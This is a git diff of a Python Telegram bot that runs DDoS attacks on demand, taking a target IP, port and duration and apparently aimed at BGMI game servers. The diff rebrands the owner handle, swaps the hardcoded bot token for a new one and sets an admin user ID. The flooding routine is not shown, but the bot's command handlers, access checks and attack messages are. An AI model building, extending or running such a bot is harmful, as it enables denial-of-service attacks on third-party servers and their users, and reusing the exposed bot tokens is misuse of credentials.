@@ -2,8 +2,8 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7590125074:AAHz8zisqbUxbRmcQgUOOz_joWY7_n5baZs'
-ADMIN_USER_ID = 
+TELEGRAM_BOT_TOKEN = '7149714912:AAHXtwFHk5AZhXtxtWJEJ8x7s79YJnufb5w'
+ADMIN_USER_ID = 5879540185
 USERS_FILE = 'users.txt'
 attack_in_progress = False
 
@@ -23,8 +23,8 @@ users = load_users()
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 彡[LSR]彡 𝗗𝗱𝗼𝘀*\n"
-        "*🔥 𝗢𝘄𝗻𝗲𝗿 @LSR_RAJPUT*\n"
+        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 彡[BLACK]彡 𝗗𝗱𝗼𝘀*\n"
+        "*🔥 𝗢𝘄𝗻𝗲𝗿 @BLACK_XOWNER*\n"
         "*🔥 SERVER BGMI*\n"    
         "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"                  
     )
@@ -35,7 +35,7 @@ async def manage(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @LSR_RAJPUT*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @BLACK_XOWNER*", parse_mode='Markdown')
         return
 
     if len(args) != 2:
@@ -76,7 +76,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @LSR_RAJPUT*\n*🔥 SERVER BGMI*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @BLACK_XOWNER*\n*🔥 SERVER BGMI*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -86,7 +86,7 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐨𝐧 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 » @LSR_RAJPUT*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐨𝐧 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 » @BLACK_XOWNER*", parse_mode='Markdown')
         return
 
     if attack_in_progress:
@@ -103,7 +103,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
         f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
         f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
-        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @LSR_RAJPUT*\n"        
+        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @BLACK_XOWNER*\n"        
         f"*🔥 SERVER BGMI*"           
     ), parse_mode='Markdown')
 
